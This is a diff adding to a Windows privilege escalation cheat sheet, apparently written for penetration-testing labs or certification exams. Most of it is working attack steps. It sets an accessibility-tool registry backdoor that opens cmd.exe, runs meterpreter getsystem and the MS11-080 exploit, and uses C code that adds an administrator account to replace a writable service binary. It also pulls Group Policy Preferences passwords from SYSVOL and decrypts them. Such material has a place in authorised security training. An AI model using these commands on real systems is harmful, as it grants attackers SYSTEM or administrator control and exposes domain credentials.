@@ -16,3 +16,56 @@ Vulnerable Services
 Win10:
     reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f 
     Then ctrl+alt+canc and start virtual keyboard
+    
+Windows Privilege Escalation resource http://www.fuzzysecurity.com/tutorials/16.html
+
+Try the getsystem command using meterpreter - rarely works but is worth a try. 
+    meterpreter > getsystem
+
+Metasploit Meterpreter Privilege Escalation Guide https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
+
+Windows MS11-080 - http://www.exploit-db.com/exploits/18176/
+    # python pyinstaller.py --onefile ms11-080.py mx11-080.exe -O XP
+
+Powershell Priv Escalation Tools 
+    https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.
+    icacls scsiaccess.exe
+
+    scsiaccess.exe
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+        APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+        Everyone:(I)(F)
+
+Compile a custom add user command in windows using C
+    # cat useradd.c
+    # include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+    int main ()
+    {
+    int i;
+    i=system ("net localgroup administrators low /add");
+    return 0;
+    }
+
+    # i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+Group Policy Preferences (GPP)
+A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
+
+map the Domain controller SYSVOL share
+    net use z: \\dc01\SYSVOL
+
+Find the GPP file: Groups.xml
+    dir /s Groups.xml
+
+Review the contents for passwords
+    type Groups.xml
+
+Decrypt using GPP Decrypt
+    gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
+
+Find and display the proof.txt or flag.txt - get the loot! #meterpreter > run post/windows/gather/win_privs
+    cd\ & dir /b /s proof.txt type c:\pathto\proof.txt
